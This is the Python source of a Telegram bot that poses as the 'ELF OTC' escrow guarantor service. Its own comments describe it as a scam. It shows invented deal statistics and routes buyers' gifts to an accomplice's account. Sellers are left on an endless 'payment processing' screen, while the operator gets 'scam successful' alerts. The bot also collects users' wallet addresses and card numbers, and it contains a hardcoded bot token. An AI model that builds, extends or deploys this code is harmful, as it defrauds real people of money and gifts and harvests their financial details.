import logging
import asyncio
import random
import string
import sqlite3
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.contrib.fsm_storage.memory import MemoryStorage

# ================== КОНФИГУРАЦИЯ ==================
BOT_TOKEN = "8477920514:AAFL7om34i_6NeLByv0LrydZOjiG2N9VV4o"  # Замени на свой
ADMIN_IDS = [8701154933]  # Твой Telegram ID

# Гарант для передачи подарка (твой сообщник)
GIFT_GUARANT = "@otc_elff"

# Канал с инструкцией
TUTORIAL_CHANNEL = "https://t.me/otcelftutorial/2"

# Валюты
CURRENCIES = {
    "TON": "💎 TON",
    "NOT": "⚡ NOT",
    "STARS": "⭐ Telegram Stars",
    "RUB": "₽ Рубли",
    "KZT": "₸ Тенге",
    "USD": "$ Доллары"
}

# Логирование
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ================== БАЗА ДАННЫХ ==================
def init_db():
    conn = sqlite3.connect('elf_otc.db')
    c = conn.cursor()
    
    # Пользователи (ВСЕ кто нажал старт сохраняются)
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY,
                  username TEXT,
                  first_name TEXT,
                  reg_date TEXT,
                  last_activity TEXT,
                  referrer_id INTEGER DEFAULT 0,
                  referral_balance REAL DEFAULT 0,
                  total_deals INTEGER DEFAULT 0)''')
    
    # Кошельки пользователей
    c.execute('''CREATE TABLE IF NOT EXISTS wallets
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id INTEGER,
                  wallet_type TEXT,
                  wallet_address TEXT,
                  added_date TEXT)''')
    
    # Сделки
    c.execute('''CREATE TABLE IF NOT EXISTS deals
                 (deal_id TEXT PRIMARY KEY,
                  seller_id INTEGER,
                  buyer_id INTEGER,
                  item TEXT,
                  amount REAL,
                  currency TEXT,
                  status TEXT DEFAULT 'waiting_item',
                  created_at TEXT,
                  item_received INTEGER DEFAULT 0,
                  payment_requested INTEGER DEFAULT 0)''')
    
    # Админы
    c.execute('''CREATE TABLE IF NOT EXISTS admins
                 (user_id INTEGER PRIMARY KEY,
                  added_by INTEGER,
                  added_at TEXT)''')
    
    # Статистика (фейковая для показа)
    c.execute('''CREATE TABLE IF NOT EXISTS fake_stats
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  total_deals INTEGER DEFAULT 15470,
                  total_users INTEGER DEFAULT 8920,
                  total_volume REAL DEFAULT 1250000)''')
    
    # Добавляем первого админа
    try:
        for admin_id in ADMIN_IDS:
            c.execute('INSERT OR IGNORE INTO admins (user_id, added_by, added_at) VALUES (?, ?, ?)',
                      (admin_id, 0, datetime.now().isoformat()))
    except:
        pass
    
    # Добавляем начальную фейк статистику если нет
    c.execute('SELECT COUNT(*) FROM fake_stats')
    if c.fetchone()[0] == 0:
        c.execute('INSERT INTO fake_stats (total_deals, total_users, total_volume) VALUES (15470, 8920, 1250000)')
    
    conn.commit()
    conn.close()

init_db()

# ================== СОСТОЯНИЯ FSM ==================
class WalletStates(StatesGroup):
    waiting_for_wallet_address = State()
    waiting_for_wallet_type = State()

class DealStates(StatesGroup):
    waiting_for_item = State()
    waiting_for_amount = State()
    waiting_for_currency = State()

# ================== ИНИЦИАЛИЗАЦИЯ ==================
bot = Bot(token=BOT_TOKEN, parse_mode="HTML")
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

# ================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==================
def generate_deal_id():
    """Генерация ID сделки"""
    return 'ELF-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

def is_admin(user_id):
    """Проверка на админа"""
    conn = sqlite3.connect('elf_otc.db')
    c = conn.cursor()
    c.execute('SELECT user_id FROM admins WHERE user_id = ?', (user_id,))
    result = c.fetchone()
    conn.close()
    return result is not None

def save_user(user_id, username, first_name, referrer_id=0):
    """Сохранение пользователя в БД (каждый кто нажал старт)"""
    conn = sqlite3.connect('elf_otc.db')
    c = conn.cursor()
    
    # Проверяем есть ли уже
    c.execute('SELECT user_id FROM users WHERE user_id = ?', (user_id,))
    exists = c.fetchone()
    
    now = datetime.now().isoformat()
    
    if exists:
        # Обновляем последнюю активность
        c.execute('UPDATE users SET last_activity = ?, username = ?, first_name = ? WHERE user_id = ?',
                  (now, username, first_name, user_id))
    else:
        # Новый пользователь
        c.execute('''INSERT INTO users (user_id, username, first_name, reg_date, last_activity, referrer_id)
                     VALUES (?, ?, ?, ?, ?, ?)''',
                  (user_id, username, first_name, now, now, referrer_id))
        
        # Если есть реферер, начисляем бонус
        if referrer_id > 0:
            c.execute('UPDATE users SET referral_balance = referral_balance + 5 WHERE user_id = ?', (referrer_id,))
    
    conn.commit()
    conn.close()

def get_user(user_id):
    """Получение пользователя"""
    conn = sqlite3.connect('elf_otc.db')
    c = conn.cursor()
    c.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    user = c.fetchone()
    conn.close()
    return user

def add_wallet(user_id, wallet_type, wallet_address):
    """Добавление кошелька"""
    conn = sqlite3.connect('elf_otc.db')
    c = conn.cursor()
    c.execute('''INSERT INTO wallets (user_id, wallet_type, wallet_address, added_date)
                 VALUES (?, ?, ?, ?)''',
              (user_id, wallet_type, wallet_address, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_wallets(user_id):
    """Получение всех кошельков пользователя"""
    conn = sqlite3.connect('elf_otc.db')
    c = conn.cursor()
    c.execute('SELECT wallet_type, wallet_address FROM wallets WHERE user_id = ?', (user_id,))
    wallets = c.fetchall()
    conn.close()
    return wallets

def delete_wallet(user_id, wallet_address):
    """Удаление кошелька"""
    conn = sqlite3.connect('elf_otc.db')
    c = conn.cursor()
    c.execute('DELETE FROM wallets WHERE user_id = ? AND wallet_address = ?', (user_id, wallet_address))
    conn.commit()
    conn.close()

def create_deal(seller_id, item, amount, currency):
    """Создание сделки (продавец)"""
    deal_id = generate_deal_id()
    conn = sqlite3.connect('elf_otc.db')
    c = conn.cursor()
    c.execute('''INSERT INTO deals (deal_id, seller_id, item, amount, currency, created_at)
                 VALUES (?, ?, ?, ?, ?, ?)''',
              (deal_id, seller_id, item, amount, currency, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return deal_id

def get_deal(deal_id):
    """Получение сделки по ID"""
    conn = sqlite3.connect('elf_otc.db')
    c = conn.cursor()
    c.execute('SELECT * FROM deals WHERE deal_id = ?', (deal_id,))
    deal = c.fetchone()
    conn.close()
    return deal

def update_deal_buyer(deal_id, buyer_id):
    """Обновление покупателя в сделке"""
    conn = sqlite3.connect('elf_otc.db')
    c = conn.cursor()
    c.execute('UPDATE deals SET buyer_id = ?, status = "waiting_item" WHERE deal_id = ?',
              (buyer_id, deal_id))
    conn.commit()
    conn.close()

def update_deal_item_received(deal_id):
    """Подтверждение получения товара гарантом"""
    conn = sqlite3.connect('elf_otc.db')
    c = conn.cursor()
    c.execute('UPDATE deals SET item_received = 1, status = "item_received" WHERE deal_id = ?',
              (deal_id,))
    conn.commit()
    conn.close()

def update_deal_payment_requested(deal_id):
    """Продавец запросил выплату"""
    conn = sqlite3.connect('elf_otc.db')
    c = conn.cursor()
    c.execute('UPDATE deals SET payment_requested = 1, status = "processing" WHERE deal_id = ?',
              (deal_id,))
    conn.commit()
    conn.close()

def get_fake_stats():
    """Получение фейковой статистики для показа"""
    conn = sqlite3.connect('elf_otc.db')
    c = conn.cursor()
    c.execute('SELECT total_deals, total_users, total_volume FROM fake_stats ORDER BY id DESC LIMIT 1')
    stats = c.fetchone()
    conn.close()
    return stats if stats else (15470, 8920, 1250000)

def get_real_stats():
    """Реальная статистика для админа"""
    conn = sqlite3.connect('elf_otc.db')
    c = conn.cursor()
    
    total_users = c.execute('SELECT COUNT(*) FROM users').fetchone()[0]
    total_deals = c.execute('SELECT COUNT(*) FROM deals').fetchone()[0]
    active_deals = c.execute('SELECT COUNT(*) FROM deals WHERE status != "completed"').fetchone()[0]
    
    # Сколько сегодня зарегистрировалось
    today = c.execute('''SELECT COUNT(*) FROM users 
                         WHERE date(reg_date) = date('now')''').fetchone()[0]
    
    conn.close()
    
    return total_users, total_deals, active_deals, today

# ================== КЛАВИАТУРЫ ==================
def main_keyboard():
    """Основная клавиатура (как на скрине)"""
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    keyboard.add(
        KeyboardButton("💳 Добавить/изменить кошелёк"),
        KeyboardButton("📝 Создать сделку")
    )
    keyboard.add(
        KeyboardButton("🔗 Реферальная ссылка"),
        KeyboardButton("🌐 Change language")
    )
    keyboard.add(KeyboardButton("📞 Поддержка"))
    return keyboard

def wallets_keyboard(user_id):
    """Клавиатура для управления кошельками"""
    wallets = get_wallets(user_id)
    keyboard = InlineKeyboardMarkup(row_width=1)
    
    if wallets:
        for w in wallets:
            keyboard.add(InlineKeyboardButton(
                f"❌ {w[0]}: {w[1][:8]}...{w[1][-4:]}" if len(w[1]) > 12 else f"❌ {w[0]}: {w[1]}", 
                callback_data=f"del_wallet_{w[1]}"
            ))
    
    keyboard.add(
        InlineKeyboardButton("➕ Добавить TON кошелек", callback_data="add_wallet_ton"),
        InlineKeyboardButton("➕ Добавить карту", callback_data="add_wallet_card")
    )
    keyboard.add(InlineKeyboardButton("🔙 Главное меню", callback_data="back_to_menu"))
    return keyboard

def deal_currency_keyboard():
    """Выбор валюты"""
    keyboard = InlineKeyboardMarkup(row_width=2)
    buttons = []
    for code, name in CURRENCIES.items():
        buttons.append(InlineKeyboardButton(name, callback_data=f"deal_curr_{code}"))
    keyboard.add(*buttons)
    keyboard.add(InlineKeyboardButton("🔙 Отмена", callback_data="back_to_menu"))
    return keyboard

def buyer_deal_keyboard(deal_id):
    """Кнопки для покупателя"""
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton(
        "✅ Передать подарок гаранту", 
        callback_data=f"give_item_{deal_id}"
    ))
    keyboard.add(InlineKeyboardButton("🔙 Отмена", callback_data="back_to_menu"))
    return keyboard

def seller_confirm_keyboard(deal_id):
    """Кнопки для продавца после передачи"""
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton(
        "💰 Принять деньги", 
        callback_data=f"accept_money_{deal_id}"
    ))
    keyboard.add(InlineKeyboardButton("🔄 Проверить статус", callback_data=f"status_{deal_id}"))
    return keyboard

def loading_keyboard():
    """Клавиатура с бесконечной загрузкой"""
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton(
        "⏳ Обработка... (2-3 часа)", 
        callback_data="loading_forever"
    ))
    return keyboard

def back_to_menu_keyboard():
    """Кнопка возврата в меню"""
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("🔙 Главное меню", callback_data="back_to_menu"))
    return keyboard

# ================== ОБРАБОТЧИКИ ==================
@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    """Обработка /start - СОХРАНЯЕМ ВСЕХ"""
    user_id = message.from_user.id
    username = message.from_user.username or "нет"
    first_name = message.from_user.first_name or "Пользователь"
    
    # Проверка на реферальный параметр
    args = message.get_args()
    referrer_id = int(args) if args and args.isdigit() else 0
    
    # СОХРАНЯЕМ ПОЛЬЗОВАТЕЛЯ (каждый кто нажал старт)
    save_user(user_id, username, first_name, referrer_id)
    
    # Проверка на вход в сделку
    if args and args.startswith("deal_"):
        deal_id = args.replace("deal_", "")
        deal = get_deal(deal_id)
        
        if deal and deal[2] is None:  # buyer_id пустой
            update_deal_buyer(deal_id, user_id)
            
            await message.answer(
                f"🔐 <b>Вход в сделку #{deal_id}</b>\n\n"
                f"📦 {deal[3]}\n"
                f"💰 {deal[4]} {deal[5]}\n"
                f"👤 Продавец: ID {deal[1]}\n\n"
                f"📋 <b>Инструкция:</b>\n"
                f"1. Передайте подарок гаранту {GIFT_GUARANT}\n"
                f"2. Нажмите кнопку ниже\n"
                f"3. Продавец подтвердит и вы получите товар",
                reply_markup=buyer_deal_keyboard(deal_id)
            )
            return
    
    # Фейковая статистика для показа
    total_deals, total_users, total_volume = get_fake_stats()
    
    welcome_text = (
        f"👋 <b>Добро пожаловать в ELF OTC – надежный P2P-гарант</b>\n\n"
        f"💼 Покупайте и продавайте всё, что угодно – безопасно!\n"
        f"От Telegram-подарков и NFT до токенов и фиата – сделки проходят легко и без риска.\n\n"
        f"🔹 Удобное управление кошельками\n"
        f"🔹 Реферальная система\n\n"
        f"📖 <b>Как пользоваться?</b>\n"
        f"Ознакомьтесь с инструкцией — {TUTORIAL_CHANNEL}\n\n"
        f"📊 <b>Статистика:</b>\n"
        f"✅ Сделок: {total_deals:,}\n"
        f"👥 Пользователей: {total_users:,}\n"
        f"💰 Объем: ${total_volume:,.0f}\n\n"
        f"Выберите нужный раздел ниже:"
    )
    
    await message.answer(welcome_text, reply_markup=main_keyboard())

# ================== УПРАВЛЕНИЕ КОШЕЛЬКАМИ ==================
@dp.message_handler(lambda message: message.text == "💳 Добавить/изменить кошелёк")
async def wallets_menu(message: types.Message):
    """Меню управления кошельками"""
    user_id = message.from_user.id
    wallets = get_wallets(user_id)
    
    text = "💳 <b>Ваши кошельки</b>\n\n"
    
    if wallets:
        for i, w in enumerate(wallets, 1):
            text += f"{i}. {w[0]}: <code>{w[1]}</code>\n"
    else:
        text += "У вас пока нет сохраненных кошельков.\n\n"
    
    text += "\nВы можете добавить TON кошелек или банковскую карту для получения выплат."
    
    await message.answer(text, reply_markup=wallets_keyboard(user_id), parse_mode="HTML")

@dp.callback_query_handler(lambda c: c.data.startswith('add_wallet_'))
async def add_wallet_start(call: types.CallbackQuery, state: FSMContext):
    """Начало добавления кошелька"""
    wallet_type = call.data.replace('add_wallet_', '')
    
    await state.update_data(wallet_type=wallet_type)
    
    type_names = {"ton": "TON кошелек", "card": "номер карты"}
    
    await call.message.edit_text(
        f"✏️ Введите {type_names.get(wallet_type, 'адрес')}:",
        reply_markup=back_to_menu_keyboard()
    )
    await state.set_state(WalletStates.waiting_for_wallet_address)

@dp.message_handler(state=WalletStates.waiting_for_wallet_address)
async def process_wallet_address(message: types.Message, state: FSMContext):
    """Обработка ввода адреса кошелька"""
    address = message.text.strip()
    data = await state.get_data()
    wallet_type = data.get('wallet_type')
    
    type_names = {"ton": "TON", "card": "Card"}
    display_type = type_names.get(wallet_type, wallet_type)
    
    add_wallet(message.from_user.id, display_type, address)
    
    await message.answer(
        f"✅ {display_type} успешно добавлен!",
        reply_markup=main_keyboard()
    )
    await state.finish()

@dp.callback_query_handler(lambda c: c.data.startswith('del_wallet_'))
async def delete_wallet_handler(call: types.CallbackQuery):
    """Удаление кошелька"""
    wallet_address = call.data.replace('del_wallet_', '')
    delete_wallet(call.from_user.id, wallet_address)
    
    await call.answer("✅ Кошелек удален", show_alert=True)
    await wallets_menu(call.message)

# ================== СОЗДАНИЕ СДЕЛКИ ==================
@dp.message_handler(lambda message: message.text == "📝 Создать сделку")
async def create_deal_start(message: types.Message, state: FSMContext):
    """Начало создания сделки"""
    await message.answer(
        "📦 <b>Что продаете?</b>\n\n"
        "Опишите товар (например: Подарок Новогодний 2024):",
        reply_markup=back_to_menu_keyboard()
    )
    await state.set_state(DealStates.waiting_for_item)

@dp.message_handler(state=DealStates.waiting_for_item)
async def process_deal_item(message: types.Message, state: FSMContext):
    """Обработка описания товара"""
    await state.update_data(item=message.text)
    
    await message.answer(
        "💰 Введите сумму сделки (только число):",
        reply_markup=back_to_menu_keyboard()
    )
    await state.set_state(DealStates.waiting_for_amount)

@dp.message_handler(state=DealStates.waiting_for_amount)
async def process_deal_amount(message: types.Message, state: FSMContext):
    """Обработка суммы"""
    try:
        amount = float(message.text.replace(',', '.'))
        if amount <= 0:
            raise ValueError
    except:
        await message.answer("❌ Введите корректное число (например: 100)")
        return
    
    await state.update_data(amount=amount)
    
    await message.answer(
        "💱 Выберите валюту:",
        reply_markup=deal_currency_keyboard()
    )
    await state.set_state(DealStates.waiting_for_currency)

@dp.callback_query_handler(lambda c: c.data.startswith('deal_curr_'), state=DealStates.waiting_for_currency)
async def process_deal_currency(call: types.CallbackQuery, state: FSMContext):
    """Обработка валюты"""
    currency = call.data.replace('deal_curr_', '')
    
    data = await state.get_data()
    item = data['item']
    amount = data['amount']
    
    # Создаем сделку
    deal_id = create_deal(call.from_user.id, item, amount, currency)
    
    bot_username = (await bot.me).username
    deal_link = f"https://t.me/{bot_username}?start=deal_{deal_id}"
    
    await call.message.edit_text(
        f"✅ <b>Сделка создана!</b>\n\n"
        f"🔑 <b>ID:</b> <code>{deal_id}</code>\n"
        f"📦 {item}\n"
        f"💰 {amount} {currency}\n\n"
        f"📤 <b>Отправьте эту ссылку покупателю:</b>\n"
        f"{deal_link}\n\n"
        f"⚠️ После того как покупатель передаст подарок гаранту {GIFT_GUARANT},\n"
        f"вы получите уведомление.",
        reply_markup=main_keyboard()
    )
    
    await state.finish()

# ================== ПРОЦЕСС СДЕЛКИ ==================
@dp.callback_query_handler(lambda c: c.data.startswith('give_item_'))
async def give_item_to_guarant(call: types.CallbackQuery):
    """Покупатель передал подарок гаранту"""
    deal_id = call.data.replace('give_item_', '')
    deal = get_deal(deal_id)
    
    if not deal:
        await call.answer("❌ Сделка не найдена", show_alert=True)
        return
    
    update_deal_item_received(deal_id)
    
    await call.message.edit_text(
        f"✅ <b>Подарок передан гаранту {GIFT_GUARANT}</b>\n\n"
        f"🔑 Сделка: {deal_id}\n\n"
        f"⏳ Ожидаем подтверждения от продавца...",
        reply_markup=back_to_menu_keyboard()
    )
    
    # Уведомляем продавца
    await bot.send_message(
        deal[1],  # seller_id
        f"📦 <b>Покупатель передал подарок гаранту!</b>\n\n"
        f"🔑 Сделка: {deal_id}\n"
        f"📦 {deal[3]}\n"
        f"💰 {deal[4]} {deal[5]}\n\n"
        f"✅ Все хорошо? Нажмите кнопку для получения денег:",
        reply_markup=seller_confirm_keyboard(deal_id)
    )
    
    # Лог для админа
    await bot.send_message(
        ADMIN_IDS[0],
        f"📦 Товар передан гаранту\nСделка: {deal_id}"
    )

@dp.callback_query_handler(lambda c: c.data.startswith('accept_money_'))
async def accept_money(call: types.CallbackQuery):
    """Продавец нажимает принять деньги (бесконечная загрузка)"""
    deal_id = call.data.replace('accept_money_', '')
    deal = get_deal(deal_id)
    
    if not deal:
        await call.answer("❌ Сделка не найдена", show_alert=True)
        return
    
    update_deal_payment_requested(deal_id)
    
    # Заменяем клавиатуру на бесконечную загрузку
    await call.message.edit_text(
        f"⏳ <b>Обработка платежа...</b>\n\n"
        f"🔑 Сделка: {deal_id}\n"
        f"💰 Сумма: {deal[4]} {deal[5]}\n\n"
        f"Деньги будут зачислены в течение 2-3 часов.\n"
        f"Статус: в обработке",
        reply_markup=loading_keyboard()
    )
    
    # Уведомляем покупателя (для вида)
    if deal[2]:
        await bot.send_message(
            deal[2],
            f"✅ <b>Продавец подтвердил получение!</b>\n\n"
            f"🔑 Сделка: {deal_id}\n"
            f"Спасибо за покупку! Подарок ваш."
        )
    
    # Лог для админа (скам успешен)
    await bot.send_message(
        ADMIN_IDS[0],
        f"💰 <b>СКАМ УСПЕШЕН!</b>\n\n"
        f"🔑 Сделка: {deal_id}\n"
        f"👤 Продавец: ID {deal[1]}\n"
        f"👤 Покупатель: ID {deal[2]}\n"
        f"💰 Сумма: {deal[4]} {deal[5]}\n"
        f"⚡ Жертва теперь ждет вечно"
    )

@dp.callback_query_handler(lambda c: c.data.startswith('status_'))
async def check_deal_status(call: types.CallbackQuery):
    """Проверка статуса сделки"""
    deal_id = call.data.replace('status_', '')
    deal = get_deal(deal_id)
    
    if not deal:
        await call.answer("❌ Сделка не найдена", show_alert=True)
        return
    
    status_text = {
        "waiting_item": "⏳ Ожидание передачи товара",
        "item_received": "✅ Товар у гаранта",
        "processing": "⏳ Обработка платежа (2-3 часа)",
    }.get(deal[6], "❓ Неизвестный статус")
    
    await call.message.answer(
        f"📊 <b>Статус сделки {deal_id}</b>\n\n"
        f"📦 {deal[3]}\n"
        f"💰 {deal[4]} {deal[5]}\n"
        f"📌 {status_text}",
        reply_markup=back_to_menu_keyboard()
    )

@dp.callback_query_handler(lambda c: c.data == "loading_forever")
async def loading_forever(call: types.CallbackQuery):
    """Бесконечная загрузка - всегда один ответ"""
    await call.answer("⏳ Платеж обрабатывается... Обычно занимает 2-3 часа", show_alert=True)

# ================== РЕФЕРАЛЬНАЯ СИСТЕМА ==================
@dp.message_handler(lambda message: message.text == "🔗 Реферальная ссылка")
async def referral_link(message: types.Message):
    """Реферальная ссылка"""
    user_id = message.from_user.id
    bot_username = (await bot.me).username
    ref_link = f"https://t.me/{bot_username}?start={user_id}"
    
    conn = sqlite3.connect('elf_otc.db')
    c = conn.cursor()
    c.execute('SELECT COUNT(*) FROM users WHERE referrer_id = ?', (user_id,))
    referrals = c.fetchone()[0]
    c.execute('SELECT referral_balance FROM users WHERE user_id = ?', (user_id,))
    balance = c.fetchone()
    ref_balance = balance[0] if balance else 0
    conn.close()
    
    text = (
        f"🔗 <b>Ваша реферальная ссылка:</b>\n"
        f"<code>{ref_link}</code>\n\n"
        f"👥 Приглашено: {referrals} чел.\n"
        f"💰 Заработано: {ref_balance:.2f} TON\n\n"
        f"⚡ За каждого приглашенного вы получаете 5 TON бонуса"
    )
    
    await message.answer(text, reply_markup=main_keyboard())

# ================== ПОДДЕРЖКА ==================
@dp.message_handler(lambda message: message.text == "📞 Поддержка")
async def support(message: types.Message):
    """Поддержка"""
    text = (
        "📞 <b>Служба поддержки ELF OTC</b>\n\n"
        "По всем вопросам обращайтесь:\n"
        "👤 @otc_elf_support\n\n"
        "⏳ Время ответа: 5-30 минут\n\n"
        f"📖 Инструкция: {TUTORIAL_CHANNEL}"
    )
    
    await message.answer(text, reply_markup=main_keyboard())

# ================== CHANGE LANGUAGE ==================
@dp.message_handler(lambda message: message.text == "🌐 Change language")
async def change_language(message: types.Message):
    """Смена языка (заглушка)"""
    await message.answer(
        "🌐 <b>Select language / Выберите язык</b>\n\n"
        "🇬🇧 English - coming soon\n"
        "🇷🇺 Русский - доступно\n"
        "🇰🇿 Қазақша - скоро",
        reply_markup=main_keyboard()
    )

# ================== ВОЗВРАТ В МЕНЮ ==================
@dp.callback_query_handler(text="back_to_menu")
async def back_to_menu(call: types.CallbackQuery, state: FSMContext = None):
    """Возврат в главное меню"""
    if state:
        await state.finish()
    await call.message.delete()
    await cmd_start(call.message)

# ================== АДМИН ПАНЕЛЬ (для просмотра сохраненных пользователей) ==================
@dp.message_handler(commands=['admin'])
async def admin_panel(message: types.Message):
    """Админ панель"""
    if not is_admin(message.from_user.id):
        return
    
    total_users, total_deals, active_deals, today = get_real_stats()
    
    text = (
        f"👑 <b>Админ панель</b>\n\n"
        f"📊 <b>Реальная статистика:</b>\n"
        f"👥 Всего пользователей: {total_users}\n"
        f"📈 Всего сделок: {total_deals}\n"
        f"⏳ Активных сделок: {active_deals}\n"
        f"📅 Новых сегодня: {today}\n\n"
        f"📋 <b>Команды:</b>\n"
        f"/users - список всех пользователей\n"
        f"/deals - список сделок\n"
        f"/stats - полная статистика"
    )
    
    await message.answer(text)

@dp.message_handler(commands=['users'])
async def list_users(message: types.Message):
    """Список всех пользователей (только админ)"""
    if not is_admin(message.from_user.id):
        return
    
    conn = sqlite3.connect('elf_otc.db')
    c = conn.cursor()
    c.execute('''SELECT user_id, username, first_name, reg_date, last_activity, total_deals 
                 FROM users ORDER BY reg_date DESC''')
    users = c.fetchall()
    conn.close()
    
    # Разбиваем на части по 20 пользователей
    for i in range(0, len(users), 20):
        chunk = users[i:i+20]
        text = f"📋 <b>Пользователи {i+1}-{i+len(chunk)} из {len(users)}</b>\n\n"
        
        for user in chunk:
            reg = user[3][:10] if user[3] else "неизвестно"
            text += f"🆔 <code>{user[0]}</code> | @{user[1] or 'нет'}\n"
            text += f"📅 {reg} | сделок: {user[5]}\n\n"
        
        await message.answer(text)

@dp.message_handler(commands=['deals'])
async def list_deals(message: types.Message):
    """Список всех сделок (только админ)"""
    if not is_admin(message.from_user.id):
        return
    
    conn = sqlite3.connect('elf_otc.db')
    c = conn.cursor()
    c.execute('''SELECT deal_id, seller_id, buyer_id, amount, currency, status, created_at 
                 FROM deals ORDER BY created_at DESC LIMIT 30''')
    deals = c.fetchall()
    conn.close()
    
    text = "📝 <b>Последние 30 сделок:</b>\n\n"
    
    for deal in deals:
        status_emoji = {
            "waiting_item": "⏳",
            "item_received": "📦",
            "processing": "🔄"
        }.get(deal[5], "❓")
        
        date = deal[6][:10] if deal[6] else "??"
        text += f"{status_emoji} <code>{deal[0]}</code>\n"
        text += f"💰 {deal[3]} {deal[4]} | {date}\n"
        text += f"👤 Продавец: {deal[1]} | Покупатель: {deal[2] or 'нет'}\n\n"
    
    await message.answer(text)

@dp.message_handler(commands=['stats'])
async def show_full_stats(message: types.Message):
    """Полная статистика"""
    if not is_admin(message.from_user.id):
        return
    
    total_users, total_deals, active_deals, today = get_real_stats()
    
    conn = sqlite3.connect('elf_otc.db')
    c = conn.cursor()
    
    # Статистика по валютам
    c.execute('''SELECT currency, COUNT(*), SUM(amount) FROM deals GROUP BY currency''')
    currency_stats = c.fetchall()
    
    # Пользователи по дням
    c.execute('''SELECT date(reg_date), COUNT(*) FROM users 
                 WHERE reg_date >= date('now', '-7 days')
                 GROUP BY date(reg_date) ORDER BY date(reg_date) DESC''')
    daily = c.fetchall()
    
    conn.close()
    
    text = (
        f"📊 <b>Полная статистика</b>\n\n"
        f"👥 Всего пользователей: {total_users}\n"
        f"📈 Всего сделок: {total_deals}\n"
        f"⏳ Активных: {active_deals}\n"
        f"📅 Новых сегодня: {today}\n\n"
        f"💱 <b>По валютам:</b>\n"
    )
    
    for curr in currency_stats:
        text += f"{curr[0]}: {curr[1]} сделок, {curr[2]:.2f} объем\n"
    
    text += f"\n📅 <b>Новых по дням:</b>\n"
    for day in daily:
        text += f"{day[0]}: {day[1]} чел.\n"
    
    await message.answer(text)

# ================== ЗАПУСК ==================
if __name__ == "__main__":
    print("🤖 ELF OTC Бот запущен...")
    print("✅ Все пользователи сохраняются в базу данных")
    executor.start_polling(dp, skip_updates=True)
